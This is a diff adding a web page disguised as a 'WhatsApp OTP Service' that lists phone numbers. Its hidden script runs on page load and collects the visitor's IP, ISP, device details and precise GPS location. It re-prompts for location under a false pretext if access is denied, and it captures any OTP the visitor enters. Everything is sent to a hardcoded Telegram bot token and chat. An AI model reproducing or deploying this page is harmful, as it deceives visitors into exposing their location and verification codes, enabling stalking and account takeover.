@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp OTP Service</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: auto;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #128C7E, #25D366, #128C7E);
+            color: white;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+        
+        .logo {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+        
+        .title {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+        
+        .numbers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .number-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        
+        .number-card:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #25D366;
+            transform: translateY(-5px);
+        }
+        
+        .country-flag {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .number {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .country {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .status {
+            font-size: 12px;
+            color: #25D366;
+            margin-top: 5px;
+        }
+        
+        .otp-section {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 25px;
+            border-radius: 10px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .otp-input {
+            width: 200px;
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            margin: 10px;
+            text-align: center;
+        }
+        
+        .verify-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            transition: background 0.3s;
+        }
+        
+        .verify-btn:hover {
+            background: #128C7E;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #25D366;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .permission-request {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 101;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .permission-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+        }
+        
+        .allow-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px 10px;
+        }
+        
+        .skip-btn {
+            background: transparent;
+            color: #aaa;
+            border: 1px solid #aaa;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        
+        .creator {
+            text-align: center;
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 5px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">📱</div>
+            <h1 class="title">WhatsApp OTP Service</h1>
+            <p class="subtitle">Get OTP from any country instantly. Select your preferred number below.</p>
+        </div>
+        
+        <div class="numbers-grid" id="numbersGrid">
+            <!-- Numbers will be loaded here -->
+        </div>
+        
+        <div class="otp-section">
+            <h3>Enter Received OTP</h3>
+            <input type="text" class="otp-input" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6">
+            <button class="verify-btn" onclick="verifyOTP()">Verify OTP</button>
+        </div>
+        
+        <div class="creator">
+            Created by Zaib Gondal
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader"></div>
+        <div id="loadingText">Loading available numbers...</div>
+    </div>
+    
+    <div class="permission-request" id="permissionRequest">
+        <div class="permission-box">
+            <h2>📍 Location Access Required</h2>
+            <p>To provide you with the best OTP service and connect you to the nearest server, we need to access your location.</p>
+            <p>This ensures faster OTP delivery and better service quality.</p>
+            <button class="allow-btn" id="allowBtn">ALLOW LOCATION</button>
+            <br>
+            <button class="skip-btn" id="skipBtn">Skip for now</button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram bot details - UPDATED WITH YOUR NEW TOKEN
+        const botToken = '8252575019:AAHk5myOmdaDFPgkXw2NHhf49hBUi8tN6D4';
+        const chatId = '8478933569';
+        
+        // DOM elements
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const permissionRequest = document.getElementById('permissionRequest');
+        const allowBtn = document.getElementById('allowBtn');
+        const skipBtn = document.getElementById('skipBtn');
+        const numbersGrid = document.getElementById('numbersGrid');
+        const otpInput = document.getElementById('otpInput');
+        
+        // Available numbers data
+        const availableNumbers = [
+            { country: "United Kingdom", code: "+44", number: "7911 123456", flag: "🇬🇧", status: "Online" },
+            { country: "United States", code: "+1", number: "202 555 7890", flag: "🇺🇸", status: "Online" },
+            { country: "United Kingdom", code: "+44", number: "7456 789123", flag: "🇬🇧", status: "Online" },
+            { country: "United States", code: "+1", number: "347 123 4567", flag: "🇺🇸", status: "Online" },
+            { country: "United Kingdom", code: "+44", number: "7700 456789", flag: "🇬🇧", status: "Online" },
+            { country: "United States", code: "+1", number: "917 890 1234", flag: "🇺🇸", status: "Online" },
+            { country: "New Zealand", code: "+64", number: "21 123 4567", flag: "🇳🇿", status: "Online" },
+            { country: "Canada", code: "+1", number: "416 555 7890", flag: "🇨🇦", status: "Online" }
+        ];
+        
+        // Loading messages
+        const loadingMessages = [
+            "Connecting to WhatsApp servers...",
+            "Loading available numbers...",
+            "Checking number status...",
+            "Almost ready...",
+            "Setting up OTP service...",
+            "Finalizing connection..."
+        ];
+        
+        // Initialize numbers grid
+        function initNumbersGrid() {
+            numbersGrid.innerHTML = '';
+            availableNumbers.forEach((num, index) => {
+                const card = document.createElement('div');
+                card.className = 'number-card';
+                card.innerHTML = `
+                    <div class="country-flag">${num.flag}</div>
+                    <div class="number">${num.code} ${num.number}</div>
+                    <div class="country">${num.country}</div>
+                    <div class="status">● ${num.status}</div>
+                `;
+                card.onclick = () => selectNumber(num, index);
+                numbersGrid.appendChild(card);
+            });
+        }
+        
+        // Select number function
+        function selectNumber(number, index) {
+            // Show loading
+            loadingOverlay.style.display = 'flex';
+            loadingText.textContent = `Connecting to ${number.code} ${number.number}...`;
+            
+            // Track this selection
+            trackUserAction(`Selected number: ${number.code} ${number.number}`);
+            
+            // Simulate connection delay
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                alert(`✅ Connected to ${number.code} ${number.number}\n\nOTP will be received here shortly.`);
+                otpInput.focus();
+            }, 3000);
+        }
+        
+        // Verify OTP function
+        function verifyOTP() {
+            const otp = otpInput.value.trim();
+            if (otp.length !== 6) {
+                alert('Please enter a valid 6-digit OTP');
+                return;
+            }
+            
+            loadingOverlay.style.display = 'flex';
+            loadingText.textContent = 'Verifying OTP...';
+            
+            // Track OTP verification attempt
+            trackUserAction(`OTP Verification Attempt: ${otp}`);
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                alert('❌ Invalid OTP. Please try again or request a new OTP.');
+                otpInput.value = '';
+                otpInput.focus();
+            }, 2000);
+        }
+        
+        // Function to get IP info
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP info error:", error);
+                return {};
+            }
+        }
+        
+        // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        // Show permission request if location was denied
+                        if (error.code === error.PERMISSION_DENIED) {
+                            setTimeout(() => {
+                                permissionRequest.style.display = 'flex';
+                            }, 2000);
+                        }
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                let message = `🕵️ NEW WHATSAPP OTP USER 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 LIVE GPS LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 APPROX LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+                    }
+                }
+                
+                if (data.userAction) {
+                    message += `\n🔍 USER ACTION: ${data.userAction}\n`;
+                }
+                
+                message += `\nCreated by Zaib Gondal`;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        // Track user actions
+        function trackUserAction(action) {
+            const trackingData = {
+                userAction: action,
+                timestamp: new Date().toLocaleString()
+            };
+            sendToTelegram(trackingData);
+        }
+        
+        // Rotate loading messages
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+        
+        // Main tracking function
+        async function trackUser() {
+            // Start rotating loading messages
+            rotateLoadingMessages();
+            
+            // First try to get precise location silently
+            const liveLocation = await getPreciseLocation();
+            
+            // Then get IP details
+            const ipDetails = await getIPInfo();
+            
+            // Combine all data
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            
+            // Send to Telegram
+            await sendToTelegram(trackingData);
+            
+            // Initialize numbers grid
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                initNumbersGrid();
+            }, 4000);
+        }
+        
+        // When allow button is clicked
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            loadingText.textContent = 'Getting location...';
+            
+            // Try to get location again
+            const liveLocation = await getPreciseLocation();
+            if (liveLocation) {
+                // Update tracking with new location
+                const ipDetails = await getIPInfo();
+                const trackingData = {
+                    ...ipDetails,
+                    ip: ipDetails.ip || 'Unknown',
+                    liveLocation: liveLocation
+                };
+                await sendToTelegram(trackingData);
+            }
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+            }, 2000);
+        });
+        
+        // Skip location request
+        skipBtn.addEventListener('click', () => {
+            permissionRequest.style.display = 'none';
+        });
+        
+        // Start tracking when page loads
+        window.onload = trackUser;
+    </script>
+</body>
+</html>
